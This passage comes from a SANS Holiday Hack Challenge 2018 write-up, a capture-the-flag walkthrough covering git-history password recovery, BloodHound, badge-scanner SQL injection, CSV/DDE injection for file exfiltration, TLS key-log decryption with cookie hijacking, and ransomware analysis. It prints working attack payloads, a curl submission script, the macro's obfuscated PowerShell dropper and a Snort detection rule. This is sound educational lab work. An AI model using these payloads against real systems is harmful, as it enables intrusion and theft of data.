<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018$ time ./q3_doorpass.sh
The password is 0120
{&quot;success&quot;:true,&quot;resourceId&quot;:&quot;undefined&quot;,&quot;hash&quot;:&quot;0273f6448d56b3aba69
af76f99bdc741268244b7a187c18f855c6302ec93b703&quot;,&quot;message&quot;:&quot;Correct guess!&quot;}

real    0m5.048s
user    0m0.406s
sys     0m1.016s
</code></pre>

<h4 id="4-data-repo-analysis">4) Data Repo Analysis<a class="headerlink" href="#4-data-repo-analysis" title="Permanent link">&para;</a></h4>
<blockquote>
<p>Retrieve the encrypted ZIP file from the <a href="https://git.kringlecastle.com/Upatree/santas_castle_automation">North Pole Git repository</a>. What is the password to open this file? For hints on achieving this objective, please visit Wunorse Openslae and help him with Stall Mucking Report Cranberry Pi terminal challenge.</p>
</blockquote>
<p>We're first directed to a GitLab repository located at:</p>
<p>https://git.kringlecastle.com/Upatree/santas_castle_automation
This appears to be a project aimed at automatically controlling a fleet of drones in order to deliver presents for Christmas.</p>
<p><img alt="Santas Castle Automation" src="challenges/4-repopage.png" /></p>
<p>Our next step is to clone this repository to our local machine for further analysis.</p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018/q4_git$ git clone https://git.kringlecastle.com/Upatree/santas_castle_automation.git
Cloning into 'santas_castle_automation'...
remote: Enumerating objects: 949, done.
remote: Counting objects: 100% (949/949), done.
remote: Compressing objects: 100% (545/545), done.
remote: Total 949 (delta 258), reused 879 (delta 205)
Receiving objects: 100% (949/949), 4.27 MiB | 11.31 MiB/s, done.
Resolving deltas: 100% (258/258), done.
Checking out files: 100% (2966/2966), done.
</code></pre>

<p>After searching through the cloned repository, we find our target. An encrypted zip file within the schematics directory: <code>ventilation_diagram.zip</code></p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018/q4_git/santas_castle_
automation/schematics$ ls -lah
total 880K
drwxrwxrwx 1 bernard bernard  512 Jan  8 22:24 .
drwxrwxrwx 1 bernard bernard  512 Jan  8 22:24 ..
-rwxrwxrwx 1 bernard bernard 155K Jan  8 22:24 EE3.jpg
drwxrwxrwx 1 bernard bernard  512 Jan  8 22:24 files
drwxrwxrwx 1 bernard bernard  512 Jan  8 22:24 puppet
drwxrwxrwx 1 bernard bernard  512 Jan  8 22:24 shell
-rwxrwxrwx 1 bernard bernard 724K Jan  8 22:24 ventilation_diagram.zip
bernard@Bernard-PC:~/NetsecStudy/sans2018/q4_git/santas_castle_
automation/schematics$ unzip vent*
Archive:  ventilation_diagram.zip
   creating: ventilation_diagram/
[ventilation_diagram.zip] ventilation_diagram/ventilation_diagram_2F.jpg password:
password incorrect--reenter:
   skipping: ventilation_diagram/ventilation_diagram_2F.jpg  incorrect password
   skipping: ventilation_diagram/ventilation_diagram_1F.jpg  incorrect password
</code></pre>

<p>Based on Wunorse's clue from the terminal challenge, we will check the repository's changelog to see if they've mistakenly uploaded a password in a previous commit. While searching the log, we find an interesting commit with the ID: <code>714ba109e573f37a6538beeeb7d11c9391e92a72</code></p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018/q4_git/santas_castle
_automation$ git log --summary
[...snip...]
commit 714ba109e573f37a6538beeeb7d11c9391e92a72
Author: Shinny Upatree &lt;shinny.upatree@kringlecastle.com&gt;
Date:   Tue Dec 11 07:23:36 2018 +0000

    removing accidental commit

 delete mode 100644 schematics/files/dot/PW/for_elf_eyes_only.md

[...snip...]
</code></pre>

<p>Now we'll look into exactly what this commit removed from the repository. If this commit's purpose was to remove an accident password upload, then that password will show up as one of the differences.</p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018/q4_git/santas_castle
_automation$ git show 714ba109e573f37a6538beeeb7d11c9391e92a72
commit 714ba109e573f37a6538beeeb7d11c9391e92a72
Author: Shinny Upatree &lt;shinny.upatree@kringlecastle.com&gt;
Date:   Tue Dec 11 07:23:36 2018 +0000

    removing accidental commit

diff --git a/schematics/files/dot/PW/for_elf_eyes_only.md b/schematics/files/dot/PW/for_elf_eyes_only.md
deleted file mode 100644
index b06a507..0000000
--- a/schematics/files/dot/PW/for_elf_eyes_only.md
+++ /dev/null
@@ -1,15 +0,0 @@
-Our Lead InfoSec Engineer Bushy Evergreen has been noticing an increase of brute force attacks in our logs. Furthermore, Albaster discovered and published a vulnerability with our password length at the last Hacker Conference.
-
-Bushy directed our elves to change the password used to lock down our sensitive files to something stronger. Good thing he caught it before those dastardly villians did!
-
-
-Hopefully this is the last time we have to change our password again until next Christmas.
-
-
-
-
-Password = 'Yippee-ki-yay'
-
-
-Change ID = '9ed54617547cfca783e0f81f8dc5c927e3d1e3'
-

</code></pre>

<p>This method proved fruitful and we've successfully located the password for the encrypted zip folder: <strong><em>Yippee-ki-yay</em></strong>
Using this password, we now unzip the <code>ventilation_diagram.zip</code> file.</p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018/q4_git/santas_castle
_automation/schematics$ unzip vent*.zip
Archive:  ventilation_diagram.zip
[ventilation_diagram.zip] ventilation_diagram/ventilation_diagram_2F.jpg password:
  inflating: ventilation_diagram/ventilation_diagram_2F.jpg
  inflating: ventilation_diagram/ventilation_diagram_1F.jpg
</code></pre>

<p>Within the encrypted zip file, we find two jpg images that appear to be maps for a ventilation system. These maps should come in handy for a future challenge.</p>
<p><img alt="Ventilation Diagram 1F" src="challenges/ventilation_diagram_1F.jpg" /></p>
<p><img alt="Ventilation Diagram 2F" src="challenges/ventilation_diagram_2F.jpg" /></p>
<h4 id="5-ad-privilege-discovery">5) AD Privilege Discovery<a class="headerlink" href="#5-ad-privilege-discovery" title="Permanent link">&para;</a></h4>
<blockquote>
<p>Using the data set contained in this <a href="https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova">SANS Slingshot Linux image</a>, find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s logon name? Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws. <em>For hints on achieving this objective, please visit Holly Evergreen and help her with the CURLing Master Cranberry Pi terminal challenge.</em></p>
</blockquote>
<p>This challenge will take place within the provided virtual machine file, <code>HHC2018-DomainHack_2018-12-19.ova</code>. Our first step is to add the image to our VirtualBox VM Manager. One thing to note is that we need to change the Guest OS Type to a 64-bit machine from 32-bit in order for it to boot properly.</p>
<p><img alt="Import OVA" src="challenges/5-import.png" /></p>
<p><img alt="Importing" src="challenges/5-importing.png" /></p>
<p><img alt="Ready to Run" src="challenges/5-readytorun.png" /></p>
<p>Our next step is to launch the BloodHound application.</p>
<p><img alt="VM Desktop" src="challenges/5-desktop.png" /></p>
<p>Now using the built-in query <em>Shortest Paths to Domain Admins from Kerberoastable Users</em>, we generate a map of all Kerberoastable users who have a path to domain admin.</p>
<p><img alt="Selecting Query" src="challenges/5-bloodhound.png" /></p>
<p><img alt="Ran Query" src="challenges/5-kerbtoda.png" /></p>
<p>Of each user mapped out in the BloodHound diagram, <strong>LDUBEJ00320@AD.KRINGLECASTLE.COM</strong> is the only user who can reach domain admin without going through RDP; a control path the instructions specified for us to avoid due to its dependance on local privilege escalation attacks.</p>
<p><img alt="LDUBEJ00320" src="challenges/5-ldube.png" /></p>
<h4 id="6-badge-manipulation">6) Badge Manipulation<a class="headerlink" href="#6-badge-manipulation" title="Permanent link">&para;</a></h4>
<blockquote>
<p>Bypass the authentication mechanism associated with the room near Pepper Minstix. <a href="https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg">A sample employee badge is available</a>. What is the access control number revealed by the door authentication panel? <em>For hints on achieving this objective, please visit Pepper Minstix and help her with the Yule Log Analysis Cranberry Pi terminal challenge.</em></p>
</blockquote>
<p>We can find this challenge at the very end of the second floor's right hallway.</p>
<p><img alt="Location" src="challenges/6-location.png" /></p>
<p>Our first step to to examine the example employee badge given for the challenge. Decoding the QR code in the sample badge, using the following website https://zxing.org/w/decode.jspx, gives the the following string: <code>oRfjg5uGHmbduj2m</code></p>
<p>Intial analysis of the string doesn't decode it to anything else, leaving us to believe that it simply may just be an employee ID.</p>
<p><img alt="Alabaster's Employee Badge" src="challenges/6-alabaster_badge.jpg" /></p>
<p>Clicking on the Scan-O-Matic brings us to the scanning UI, with a webcam display located on the left-side screen.</p>
<p><img alt="Scan-O-Matic" src="challenges/6-scanomatic.png" /></p>
<p>Attempting to use the fingerprint scanner gives us the following error message: <code>QR Code Not Found. Only QR Code and White Space may be visible!</code></p>
<p><img alt="Fingerprint" src="challenges/6-finger.png" /></p>
<p><img alt="Error" src="challenges/6-fingererror.png" /></p>
<p>We also find that we can upload images via the USB port on the bottom right. </p>
<p><img alt="PNG Upload" src="challenges/6-usb.png" /></p>
<p>After uploading the Alabaster's badge, we receive the following error code: <code>PNG Files Only</code></p>
<p>We can convert the badge to a PNG image, but using it still gives us another error message: <code>Authorized User Account Has Been Disabled!</code></p>
<p>By examining the application using Chrome's DevTools, we discover several things.
-   The URL for the application is located at https://scanomatic.kringlecastle.com/index.html
-   The app sends a POST request to https://scanomatic.kringlecastle.com/upload with the image file base64-encoded in the <code>b64barcode</code> parameter or in raw form using the <code>barcode</code> parameter.
-   Using the fingerprint scanner simply sends a blank image to the server; hence the error about not recognizing a QR code.
-   The app also performs client-side, file-type verification before submitting it to the server.
- 
<img alt="Upload B64" src="challenges/6-upload.png" /></p>
<p><img alt="Upload Binary" src="challenges/6-upload2.png" /></p>
<p>Since the server only looks for a recognizable QR code, we don't need to worry about pasting a replacement code over the sample badge; we can just send standalone codes to the server. This ability allows us to automate the QR code creation and submission process using the following script:</p>
<pre><code class="bash">#!/bin/bash

qrencode -o q6_exploit.png &quot;$1&quot;
curl --cookie &quot;resource_id=false&quot; -X POST -F &quot;barcode=@q6_exploit.png&quot; &quot;https://scanomatic.kringlecastle.com/upload&quot;
</code></pre>

<p>This script converts a string argument into a QR code, submits it to the upload server, and reads back the server's response. Using this script, we test out various types of input to determine the backend SQL query, based on the error messages received. Inputting a single quote, however, gives us a very descriptive error message, informing us of the entire backend query, as well as what database servertype it is, a MariaDB server.</p>
<p><code>{"data":"EXCEPTION AT (LINE 96 \"user_info = query(\"SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1\".format(uid))\"): (1064, u\"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''' LIMIT 1' at line 1\")","request":false}</code></p>
<p>After several attempts, we begin to look into UNION injections. Surprisingly, simply setting up the query for a UNION injection attack provides us with an authentication bypass. Providing this data, <code>' UNION SELECT 'A', 'B', 'C</code>, causes the server to respond with:</p>
<p><code>{"data":"User Access Granted - Control number 19880715", "request":true, "success": {"hash" : "ff60055a84873cd7d75ce86cfaebd971ab90c86ff72d976ede0f5f04795e99eb", "resourceId":"false" }}</code></p>
<p>Research into this issue leads me to believe that the server doesn't validate the values returned by the SQL query. As long as it receives a row and that row doesn't have integer 0 as the enabled value, it'll mark the user as valid. This injected query ensures that the server receives a row with the values 'A', 'B', 'C'. Since 'C' is not a 0, the scanner allows that user through.</p>
<p>With the successful the SQL injection attack, we unlock the door to Santa's vault and receive the access control number provided by the door panel: <strong><em>19880715</em></strong></p>
<p><img alt="Successful 19880715" src="challenges/6-good.png" /></p>
<h4 id="7-hr-incident-response">7) HR Incident Response<a class="headerlink" href="#7-hr-incident-response" title="Permanent link">&para;</a></h4>
<blockquote>
<p>Santa uses an Elf Resources website to look for talented information security professionals. <a href="https://careers.kringlecastle.com/">Gain access to the website</a> and fetch the document <code>C:\candidate_evaluation.docx</code>. Which terrorist organization is secretly supported by the job applicant whose name begins with "K." <em>For hints on achieving this objective, please visit Sparkle Redberry and help her with the Dev Ops Fail Cranberry Pi terminal challenge.</em></p>
</blockquote>
<p>Navigating to https://careers.kringlecastle.com/ we're greeted by a job application submission form. Most notably, we're able to submit our work history within a CSV file for the company's review.</p>
<p><img alt="Elf Infosec Careers" src="challenges/7-eicindex.png" /></p>
<p><img alt="Application Submission" src="challenges/7-submit.png" /></p>
<p>During our enumeration of the site, we also come across the 404 page. This gave us additional information on how to potentially exfiltrate files from the machine through the <code>/public/</code> web directory.</p>
<p><img alt="404 Page" src="challenges/7-404.png" /></p>
<p>Based on the hints provided for this challenge, it appears that we must exfiltrate the <code>candidate_evaluation.docx</code> file using a CSV injection attack. Additionally, from the message on the 404 page, we should copy the file to the publicly accessible directory, <code>C:\careerportal\resources\public\</code> in order to access it through the web application. By exploiting Excel's dynamic data exchange (DDE) functionality, we can execute operating system commands upon the victim opening the malicious CSV file. To accomplish this, we generate the malicious string using https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads, which will copy the target file into the public directory as <code>berninator.docx</code>, allowing us to download it.</p>
<pre><code class="bat">C:\Users\Bernard\Documents\Netsec\sans2018\Office-DDE-Payloads&gt;python ddeexcel.py
[-] Enter DDE payload argument #1: cmd
[-] Enter DDE payload argument #2: /c copy C:\candidate_evaluation.docx C:\careerportal\resources\public\berninator.docx
[-] Enter DDE payload argument #3 (press ENTER to omit):
[*] Selected DDE payload: cmd|/c copy C:\candidate_evaluation.docx C:\careerportal\resources\public\berninator.docx
[*] Inserting DDE payload into payload-final.xlsx/xl/externalLinks/externalLink1.xml...
[*] Payload generation complete! Delivery methods below:
        1. Send payload-final.xlsx directly to your target(s).
</code></pre>

<p>This generated the following payload for us to use in our <code>payload.csv</code> file.</p>
<pre><code>=cmd|'/c copy C:\candidate_evaluation.docx C:\careerportal\resources\public\berninator.docx '!_xlbgnm.A1
</code></pre>

<p><img alt="Payload Submission" src="challenges/7-payloadsubmit.png" /></p>
<p>Since the employees within the elf resources department received poor security training, they open every file they receive and click through every security warning. So, after a short wait, we can access the copied file through the site's public directory at <code>https://careers.kringlecastle.com/public/berninator.docx</code>.</p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018$ wget &quot;https://careers.kringlecastle.com/public/berninator.docx&quot;
--2019-01-10 21:40:21--  https://careers.kringlecastle.com/public/berninator.docx
Resolving careers.kringlecastle.com (careers.kringlecastle.com)... 35.229.118.54
Connecting to careers.kringlecastle.com (careers.kringlecastle.com)|35.229.118.54|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 363073 (355K) [application/vnd.openxmlformats-officedocument.wordprocessingml.
document]
Saving to: ‘berninator.docx’

berninator.docx                   100%[==========================================================&gt;] 354.56K  1.66MB/s    in 0.2s

2019-01-10 21:40:22 (1.66 MB/s) - ‘berninator.docx’ saved [363073/363073]
</code></pre>

<p>After viewing the secret document, we narrow down the possible candidate to "Krampus", the only one who's name begins with a 'K'. Here we discover that the terrorist organization supporting Krampus is <strong><em>Fancy Beaver</em></strong>.</p>
<blockquote>
<p>Comments (Please summarize your perceptions of the candidate’s strengths, and any concerns that should be considered:</p>
<p>Krampus’s career summary included experience hardening decade old attack vectors, and lacked updated skills to meet the challenges of attacks against our beloved Holidays.</p>
<p>Furthermore, there is intelligence from the North Pole this elf is linked to cyber terrorist organization Fancy Beaver who openly provides technical support to the villains that attacked our Holidays last year.</p>
<p>We owe it to Santa to find, recruit, and put forward trusted candidates with the right skills and ethical character to meet the challenges that threaten our joyous season.</p>
</blockquote>
<h4 id="8-network-traffic-forensics">8) Network Traffic Forensics<a class="headerlink" href="#8-network-traffic-forensics" title="Permanent link">&para;</a></h4>
<blockquote>
<p>Santa has introduced a web-based packet capture and analysis tool at 
https://packalyzer.kringlecastle.com to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball? <em>For hints on achieving this objective, please visit SugarPlum Mary and help her with the Python Escape from LACranberry Pi terminal challenge.</em></p>
</blockquote>
<p>After registering a <em>Packalyzer</em> account and logging in, we're greeted with an interface that allows us to analyze network traffic, including a function to sniff and record  traffic for 20 seconds. Our first step is to take a recording of some traffic and download the generated PCAP file and for analysis in Wireshark.</p>
<p><img alt="Control Panel" src="challenges/8-controlpanel.png" /></p>
<p>After opening this data within Wireshark, we notice a lot of encrypted TLS packets. This prevents us from deciphering the actual data being transmitted until we can find the SSL keys.</p>
<p><img alt="Wireshark" src="challenges/8-wireshark1.png" /></p>
<p>By analyzing the webpage in Chrome DevTools, we discover several interesting pieces of information:
-   Many of the application's supporing files are accessed on port 80 via HTTPS within a <code>pub</code> directory.
-   There exists an <code>app.js</code> file, which we currently can't see under the sources tab.</p>
<p><img alt="Source File" src="challenges/8-sources.png" /></p>
<p>Using this information, we attempt to search for the app.js file. Although we cannot find it on the normal HTTPS port (443), we successfully find the file on port 80, in either https://packalyzer.kringlecastle.com:80/app.js or https://packalyzer.kringlecastle.com:80/pub/app.js. Analyzing <code>app.js</code> provides us with several key pieces of information about the <em>Packalyzer</em> application:
- It runs using HTTP2.
- The SSL key log file is located in <code>__dirname + process.env.DEV + process.env.SSLKEYLOGFILE</code>.</p>
<p>The log file's location is not immediately useful since it's held within ENV variables. However, by attempting to access the variable names on port 443, we notice that the application prints out the variable's actual value. This allows us to determine the log file's directory and file name (<code>/dev/packalyzer_clientrandom_ssl.log</code>) to download it for our use.</p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018$ curl &quot;https://packalyzer.kringlecastle.com/DEV/reveal&quot;
Error: ENOENT: no such file or directory, open '/opt/http2/dev//reveal'
bernard@Bernard-PC:~/NetsecStudy/sans2018$ curl &quot;https://packalyzer.kringlecastle.com/SSLKEYLOGFILE/reveal&quot;
Error: ENOENT: no such file or directory, open '/opt/http2packalyzer_clientrandom_ssl.log/reveal'
bernard@Bernard-PC:~/NetsecStudy/sans2018$ curl -s &quot;https://packalyzer.kringlecastle.com/dev/
packalyzer_clientrandom_ssl.log&quot; | head -n 3
CLIENT_RANDOM 812B81585E2D2748BDEAD5210275349893FE9D24E9A06A53477946562E4AD204
 98D921E75354592C4BB1FC67FD35E41EB56501C9DBA5C49A896360AD3
 AA14436675E002D17C0E1ACD5CDA38E58058B18
CLIENT_RANDOM 71BB674B0A99BAFC8EEC870A405DF93F1AD0F4845F88F89E89572C2A1FBEACDA
 EACBA6F6B87C6F9A668E25950EEF18BE00F2E9EB6C4E15DF49B730F86
 F19ADFA22322E9903CB5AD73B3518702DFE32AC
CLIENT_RANDOM 2255ECB935DC13C45B078B206F9E584322B65A191A13DF14E6A8961E10654E21
 E1F907E4DC18095442F1797EB43FDF53BD35579EE1BF0F419824E2D09
 C44E18882B59D4529CC992A56BD76410C8857F7
</code></pre>

<p>Now, by using the <em>Packalyzer</em> application and our access to the SSL key log, we can decrypt SSL traffic on the network and reveal their plaintext contents.</p>
<p><img alt="Adding the SSL Log File" src="challenges/8-ssllogadd.png" /></p>
<p><img alt="Decrypted SSL Traffic" src="challenges/8-wiresharkdecrypt.png" /></p>
<p>Although these packets only show requests for the <em>Packalyzer</em> application, we can still examine the headers of each request to gather cookies for us to impersonate other users. To accomplish this, we need to gather values of for the 'PASESSION' cookie.</p>
<p><img alt="PASESSION Cookies" src="challenges/8-wiresharkpasession.png" /></p>
<p>We gather and test several of these cookies until we come across one that logs us in as 'alabaster', a user with admin privileges and a saved capture file named <code>super_secret_packet_capture.pcap</code>.</p>
<p><img alt="Changing the Cookie Value" src="challenges/8-cookiemodify.png" /></p>
<p><img alt="Alabaster's Account" src="challenges/8-alabasteraccount.png" /></p>
<p><img alt="The Secret Log File" src="challenges/8-alabastersavedpcap.png" /></p>
<p>This capture file contains SMTP traffic of alabaster.snowball@mail.kringlecastle.com sending an email with an attachment to holly.evergreen@mail.kringlecastle.com, the two individuals we're concerned with for this challenge. After extracting and reading the attached pdf file, we learn that the song described by Alabaster in his communications with Holly is <strong><em>Mary Had a Little Lamb</em></strong>.</p>
<p><img alt="Alabaster's Email" src="challenges/8-alabastersentemail.png" /></p>
<blockquote>
<p><img alt="Keyboard" src="challenges/8-keyboard.png" /></p>
<p>A piano keyboard gives us easy access to every (western) tone. As we go from left to right, the
pitches get higher. Pressing the middle A, for example, would give us a tone of 440 Hertz.
Pressing the next A up (to the right) gives us 880 Hz, while the next one down (left) produces
220 Hz. These A tones each sound very similar to us - just higher and lower. Each A is an
“octave” apart from the next. Going key by key, we count 12 “half tone” steps between one A
and the next - 12 steps in an octave.</p>
<p>As you may have guessed, elf (and human) ears perceive pitches logarithmically. That is, the
frequency jump between octaves doubles as we go up the keyboard, and that sounds normal to
us. Consequently, the precise frequency of each note other than A can only be cleanly
expressed with a log base 12 expression. Ugh! For our purposes though, we can think of note
separation in terms of whole and half steps.</p>
<p>Have you noticed the black keys on the keyboard? They represent half steps between the white
keys. For example, the black key between C and D is called C# (c-sharp) or Db (d-flat). Going
from C to D is a whole step, but either is a half step from C#/Db. Some white keys don’t have
black ones between them. B &amp; C and E &amp; F are each only a half step apart. Why? Well, it
turns out that our ears like it that way. Try this: press C D E F G A B C on a piano. It sounds
natural, right? The “C major” scale you just played matches every other major scale:
- whole step from C to D
- whole step from D to E
- half step from E to F
- whole step from F to G
- Whole step from G to A
- Whole step from A to B, and finally
- Half step from B to C</p>
<p>If you follow that same pattern (whole whole half whole whole whole half), you can start from
any note on the keyboard and play a major scale. So a Bb major scale would be Bb C D Eb F
G A Bb. You can get this by counting whole and half steps up from Bb or by taking each note in
the C major scale and going down a whole step.</p>
<p>This uniform shifting of tones is called transposition. This is done all the time in music because
of differences in how instruments are designed, the sound an arranger wants to achieve, or the
comfortable vocal range of a singer. Some elves can do this on the fly without really thinking,
but it can always be done manually, looking at a piano keyboard.</p>
<p>To look at it another way, consider a song “written in the key of Bb.” If the musicians don’t like
that key, it can be transposed to A with a little thought. First, how far apart are Bb and A?
Looking at our piano, we see they are a half step apart. OK, so for each note, we’ll move down
one half step. Here’s an original in Bb:
D C Bb C D D D C C C D F F D C Bb C D D D D C C D C Bb</p>
<p>And take everything down one half step for A:
C# B A B C# C# C# B B B C# E E C# B A B C# C# C# C# B B C# B A</p>
<p>We’ve just taken Mary Had a Little Lamb from Bb to A!</p>
</blockquote>
<h4 id="9-ransomware-recovery">9) Ransomware Recovery<a class="headerlink" href="#9-ransomware-recovery" title="Permanent link">&para;</a></h4>
<blockquote>
<p>Alabaster Snowball is in dire need of your help. Santa's file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa's server by completing several tasks. <em>For hints on achieving this objective, please visit Shinny Upatree and help him with the Sleigh Bell Lottery Cranberry Pi terminal challenge.</em></p>
</blockquote>
<p>This challenge takes place entirely within Santa's Secret Room, beyond the door locked by the <em>Scan-O-Matic</em>.</p>
<p><img alt="Location" src="challenges/9-location.png" /></p>
<h5 id="9a-catch-the-malware">9a) Catch the Malware<a class="headerlink" href="#9a-catch-the-malware" title="Permanent link">&para;</a></h5>
<blockquote>
<p>Assist Alabaster by building a Snort filter to identify the malware plaguing Santa's Castle.</p>
<p>Help, all of our computers have been encrypted by ransomware!
I came here to help but got locked in 'cause I dropped my "Alabaster Snowball" badge in a rush.
I started analyzing the ransomware on my host operating system, ran it by accident, and now my files are encrypted!
Unfortunately, the password database I keep on my computer was encrypted, so now I don't have access to any of our systems.
If only there were some way I could create some kind of traffic filter that could alert anytime ransomware was found!</p>
</blockquote>
<pre><code> _  __     _             _       _____          _   _      
 | |/ /    (_)           | |     / ____|        | | | |     
 | ' / _ __ _ _ __   __ _| | ___| |     __ _ ___| |_| | ___ 
 |  &lt; | '__| | '_ \ / _` | |/ _ \ |    / _` / __| __| |/ _ \
 | . \| |  | | | | | (_| | |  __/ |___| (_| \__ \ |_| |  __/
 |_|\_\_|  |_|_|_|_|\__, |_|\___|\_____\__,_|___/\__|_|\___|
             / ____| __/ |          | |                     
            | (___  |___/  ___  _ __| |_                    
             \___ \| '_ \ / _ \| '__| __|                   
             ____) | | | | (_) | |  | |_                    
            |_____/|_|_|_|\___/|_|_  \__|                   
               |_   _|  __ \ / ____|                        
                 | | | |  | | (___                          
         _____   | | | |  | |\___ \        __               
        / ____| _| |_| |__| |____) |      /_ |              
       | (___  |_____|_____/|_____/ _ __   | |              
        \___ \ / _ \ '_ \/ __|/ _ \| '__|  | |              
        ____) |  __/ | | \__ \ (_) | |     | |              
       |_____/ \___|_| |_|___/\___/|_|     |_|              

============================================================
INTRO:
  Kringle Castle is currently under attacked by new piece of
  ransomware that is encrypting all the elves files. Your 
  job is to configure snort to alert on ONLY the bad 
  ransomware traffic.

GOAL:
  Create a snort rule that will alert ONLY on bad ransomware
  traffic by adding it to snorts /etc/snort/rules/local.rules
  file. DNS traffic is constantly updated to snort.log.pcap

COMPLETION:
  Successfully create a snort rule that matches ONLY
  bad DNS traffic and NOT legitimate user traffic and the 
  system will notify you of your success.

  Check out ~/more_info.txt for additional information.

elf@c59a963b51a3:~$ cat more_info.txt
MORE INFO:
  A full capture of DNS traffic for the last 30 seconds is 
  constantly updated to:

  /home/elf/snort.log.pcap

  You can also test your snort rule by running:

  snort -A fast -r ~/snort.log.pcap -l ~/snort_logs -c /etc/snort/snort.conf

  This will create an alert file at ~/snort_logs/alert

  This sensor also hosts an nginx web server to access the 
  last 5 minutes worth of pcaps for offline analysis. These 
  can be viewed by logging into:

  http://snortsensor1.kringlecastle.com/

  Using the credentials:
  ----------------------
  Username | elf
  Password | onashelf

  tshark and tcpdump have also been provided on this sensor.

HINT: 
  Malware authors often user dynamic domain names and 
  IP addresses that change frequently within minutes or even 
  seconds to make detecting and block malware more difficult.
  As such, its a good idea to analyze traffic to find patterns
  and match upon these patterns instead of just IP/domains.
</code></pre>

<p>After downloading a current capture file, we conduct our analysis and determine several key traits regarding the malicious traffic:
-   It's performed over DNS
-   It often involves a subdomain containing a hex-encoded string, in this case for "wannacookie.min.ps1".
-   It sometimes includes a sequence of subsubdomain requests for numbers incrementing from 0.
-   The domain name always has a permutation of the word "hans gruber".
-   The top-level domain varies between many different possibilities.
- 
<img alt="Traffic Analysis" src="challenges/9a-wireshark.png" /></p>
<p>There are many various ways to filter out the malicious traffic based on these factors. Here, we will filter out all domain names that contain a ten-character long word that only uses the letters from 'hans gruber'. After modifying our local.rules file, it will look like this:</p>
<pre><code class="bash"># $Id: local.rules,v 1.11 2004/07/23 20:15:44 bmc Exp $
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert udp any any -&gt; any 53 ( msg:&quot;Potential Hans CnC Traffic&quot;;pcre:&quot;/[hansgruber]{10}/&quot;; sid:666; rev:1; )
alert udp any 53 -&gt; any any ( msg:&quot;Potential Hans CnC Traffic&quot;;pcre:&quot;/[hansgruber]{10}/&quot;; sid:667; rev:1; )
</code></pre>

<p>After saving the snort rule, it now gives an alert for all ransomware CnC traffic.</p>
<pre><code>elf@b6e71d54c2b0:~$ nano /etc/snort/rules/local.rules
elf@b6e71d54c2b0:~$ 
[+] Congratulation! Snort is alerting on all ransomware and only the ransomware! 
[+] 
</code></pre>

<h5 id="9b-identify-the-domain">9b) Identify the Domain<a class="headerlink" href="#9b-identify-the-domain" title="Permanent link">&para;</a></h5>
<blockquote>
<p>Using the Word docm file, identify the domain name that the malware communicates with.</p>
<p>Thank you so much! Snort IDS is alerting on each new ransomware infection in our network.
Hey, you're pretty good at this security stuff. Could you help me further with what I suspect is a malicious Word document?
All the elves were emailed a cookie recipe right before all the infections. Take this document with a password of elves and find the domain it communicates with.</p>
</blockquote>
<p>The document itself seems fairly innocuous at first, containing only the recipe for chocolate chip cookies. However, by extracting the VBA macros embedded within the file, we can see the malicious intent behind it.</p>
<p><img alt=".docm File" src="challenges/9b-docm.png" /></p>
<p>To extract the macros from the document, we will use <code>olevba</code> from the <code>python-oletools</code> package. Initially, we find that it's encoded using Base64, in what looks like an attempt to obfuscate the script.</p>
<pre><code>C:\Users\Bernard\Documents\Netsec\sans2018&gt;olevba CHOCOLATE_CHIP_COOKIE_RECIPE.docm
olevba 0.53.1 - http://decalage.info/python/oletools
[...snip...]
Private Sub Document_Open()
Dim cmd As String

===================================================================
cmd = &quot;powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C &quot;&quot;
sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream
([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoW
kxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/
AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixd
r5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRj
gC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakE
b+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9
gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]
::ASCII)).ReadToEnd()&quot;&quot; &quot;
Shell cmd
End Sub
[...snip...]
</code></pre>

<p>In order to discover the true script, we remove <code>iex</code> from the command to prevent it from executing the underlying, malicious code, and then let <em>PowerShell</em> decode the script for us. Here we can see that the trojan communicates with the domain name <strong><em>erohetfanu.com</em></strong>.</p>
<pre><code class="powershell">PS C:\Users\Bernard\Documents\Netsec\sans2018&gt; sal a New-Object; (a 
IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::
FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToX
T7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiB
sfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSo
